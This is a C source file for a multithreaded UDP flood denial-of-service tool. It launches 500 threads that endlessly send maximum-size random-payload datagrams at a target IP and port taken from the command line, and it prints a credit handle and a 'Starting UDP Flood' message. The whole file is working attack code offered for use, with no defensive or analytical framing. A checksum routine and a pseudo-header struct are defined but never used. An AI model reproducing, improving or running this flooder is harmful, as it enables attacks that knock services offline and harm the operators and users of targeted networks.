#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/udp.h>
#include <netinet/ip.h>

#define MAX_GEED_GIGGLES 65507
#define IDCBOUTU_GIGGLES 500
#define SOCK_GIGGLES 5

struct pseudo_header {
    u_int32_t source_ip;
    u_int32_t dest_ip;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void *attack(void *arg) {
    char **argv = (char **)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));
    target.sin_addr.s_addr = inet_addr(argv[1]);

    int packet_size = MAX_GEED_GIGGLES;
    char *packet = malloc(packet_size);
    memset(packet, 0, packet_size);

    for (int i = 0; i < packet_size; i++) {
        packet[i] = rand() % 256;
    }

    for (int s = 0; s < SOCK_GIGGLES; s++) {
        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) continue;

        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

        while (1) {
            sendto(sock, packet, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
        }
        close(sock);
    }
    free(packet);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Credit: @wayneteller\n");
        return -1;
    }

    int port = atoi(argv[2]);
    if (port == 80 || port == 443) {
        printf("Error: Port %d (HTTP/HTTPS) diblokir!\n", port);
        return -1;
    }

    printf("Starting UDP Flood: %s:%d for %s seconds...\n", argv[1], port, argv[3]);
    int attack_time = atoi(argv[3]);
    
    pthread_t thread[IDCBOUTU_GIGGLES];
    for (int i = 0; i < IDCBOUTU_GIGGLES; i++) {
        pthread_create(&thread[i], NULL, attack, (void *)argv);
    }

    sleep(attack_time);
    return 0;
}
